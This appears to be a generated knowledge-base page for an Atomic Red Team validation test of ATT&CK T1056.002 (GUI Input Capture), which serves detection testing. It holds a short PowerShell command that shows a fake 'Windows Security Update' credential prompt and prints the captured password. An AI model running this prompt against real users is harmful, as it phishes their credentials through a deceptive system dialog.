---
atomic_guid: "2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
title: "PowerShell - Prompt User for Password"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.002"
attack_technique_name: "Input Capture: GUI Input Capture"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "2b162bfd-0928-4d4c-9ec3-4d9f88374b52"
  - "PowerShell - Prompt User for Password"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture#^t1056002-gui-input-capture|T1056.002: GUI Input Capture]]

## Executor

- name: powershell

### Command

```powershell
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.yaml)
